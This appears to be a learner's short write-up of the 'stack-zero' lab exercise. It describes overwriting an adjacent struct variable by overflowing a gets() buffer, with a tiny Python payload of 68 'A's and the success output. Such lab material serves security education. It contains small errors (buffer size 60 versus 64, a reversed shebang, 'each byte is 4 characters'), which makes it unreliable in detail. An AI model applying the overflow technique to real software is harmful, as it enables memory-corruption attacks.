Summery: 
in stack-zero, if we notice in the code, the fucntion "gets" is input from stdin and directly
and into a buffer with a size of 60. we also notice that buffer resides in a
struct with another variable called CHANGEME. The end goal is manipulating the
variable "CHANGEME"

Solution: Since we can overwrite the buffer, we can also get to the
changeme-variable easily, as structs are next to each other. given that
int is only 4 bytes, and each byte is 4 characters, we can simply write
[64 + 4] in total to get to that variable and completely control it

solution:
```python
!#/usr/bin/env python

string_42 = 'A' * (64 + 4)
print(string_42)
```

-> ./solution.py | ./stack-zero.py

outuput:
Well done, the 'changeme' variable has been changed!
